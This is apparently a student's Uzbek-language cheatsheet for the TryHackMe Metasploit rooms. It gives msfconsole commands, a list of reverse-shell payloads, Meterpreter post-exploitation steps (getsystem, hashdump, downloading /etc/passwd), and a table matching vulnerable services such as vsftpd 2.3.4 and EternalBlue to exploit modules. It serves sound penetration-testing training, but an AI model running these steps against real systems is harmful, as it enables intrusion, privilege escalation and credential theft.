# 📚 Metasploit — Mundarija

> **TryHackMe | Jr Pentester | Metasploit bo'limi**
> Barcha roomlar bo'yicha shaxsiy konspekt va cheatsheet to'plami.

---

## 🗂️ Roomlar Ro'yxati

| # | Room | Asosiy Mavzu | Fayl |
|---|------|--------------|------|
| 01 | 🎯 Introduction | msfconsole, modullar, payload turlari, auxiliary | [ms01_introduction.md](ms01_introduction.md) |
| 02 | ⚔️ Exploitation | db_nmap, exploit workflow, scanner, sessions | [ms02_exploitation.md](ms02_exploitation.md) |
| 03 | 🐚 Meterpreter | Buyruqlar, fayl, tarmoq, privilege, pivot | [ms03_meterpreter.md](ms03_meterpreter.md) |

---

## ⚡ Tezkor Cheatsheet

### 🚀 Ishga Tushirish
```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole -q
db_status
```

### 🔍 Qidirish va Tanlash
```bash
search vsftpd
search type:exploit platform:linux
search CVE-2021-44228
search rank:excellent
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
show payloads
```

### ⚙️ Sozlash va Ishlatish
```bash
set RHOSTS 10.10.10.1
set LHOST YOUR_IP
set LPORT 4444
setg LHOST YOUR_IP         # Global
run
exploit -j                 # Background
sessions                   # Ro'yxat
sessions -i 1              # Kirish
```

### 🔍 Auxiliary (Skan)
```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run
```

### 💾 Ma'lumotlar Bazasi
```bash
db_nmap -sV -T4 10.10.10.1
hosts
services
services -p 80
vulns
creds
```

### 🐚 Meterpreter
```bash
sysinfo                    # Tizim ma'lumoti
getuid                     # Foydalanuvchi
getsystem                  # Admin/SYSTEM
shell                      # Tizim shell
hashdump                   # Parol hashlari
upload file.php /tmp/      # Fayl yuklash
download /etc/passwd .     # Fayl yuklab olish
run post/multi/recon/local_exploit_suggester
migrate PID                # Prosess o'zgartirish
background                 # Orqaga (sessiya saqlanadi)
```

### 📦 Payload Turlari
```
payload/cmd/unix/reverse_bash             → Linux reverse
payload/linux/x86/meterpreter/reverse_tcp → Linux meterpreter
payload/windows/meterpreter/reverse_tcp   → Windows meterpreter
payload/windows/shell_reverse_tcp         → Windows shell

# / = Staged (ikki qism)
# _ = Single (bir qism)
```

---

## 🧠 Eslab Qolish Uchun

| Buyruq | Vazifasi |
|--------|---------|
| `search rank:excellent` | Eng yaxshi exploitlar |
| `setg LHOST IP` | Global sozlash |
| `db_nmap` | Skan + DB ga saqlash |
| `exploit -j` | Background da ishlatish |
| `sessions -i 1` | Sessiyaga kirish |
| `getsystem` | Admin imtiyoz olish |
| `hashdump` | Parol hashlari |
| `migrate PID` | Prosess o'zgartirish |

### To'liq Workflow:
```
1. msfconsole -q
2. db_nmap -sV -T4 IP
3. services → Versiyalarni ko'r
4. search XIZMAT VERSIYA
5. use EXPLOIT
6. set RHOSTS IP → set LHOST YOUR_IP
7. run → Shell!
8. Meterpreter: sysinfo → getsystem → hashdump
```

### Keng Tarqalgan Exploitlar:
```
vsftpd 2.3.4  → exploit/unix/ftp/vsftpd_234_backdoor
Samba 3.0.20  → exploit/multi/samba/usermap_script
MS17-010      → exploit/windows/smb/ms17_010_eternalblue
MS08-067      → exploit/windows/smb/ms08_067_netapi
Shellshock    → exploit/multi/http/apache_mod_cgi_bash_env_exec
```

---

*Yaratilgan: TryHackMe Jr Pentester — Metasploit bo'limi asosida*
